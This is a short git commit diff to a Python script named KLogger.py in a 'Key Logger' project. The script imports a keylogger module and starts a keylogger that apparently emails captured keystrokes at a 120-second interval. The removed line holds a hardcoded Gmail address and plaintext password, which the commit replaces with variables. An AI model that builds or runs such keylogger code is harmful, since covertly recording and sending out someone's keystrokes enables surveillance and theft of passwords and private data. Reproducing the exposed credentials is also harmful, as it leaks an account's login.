127b28714abcbcadc0fc43dca8b78b45403d6f03
Crake <64699339+crake7@users.noreply.github.com>
2020-11-09 14:35:22 -0500

    Update KLogger.py

--- Key Logger/KLogger.py
+++ Key Logger/KLogger.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, "hausada007@gmail.com", "1qaz2wsx3edc4rfv%T")
+my_keylogger = keylogger.Keylogger(120, email, password)
 my_keylogger.start()
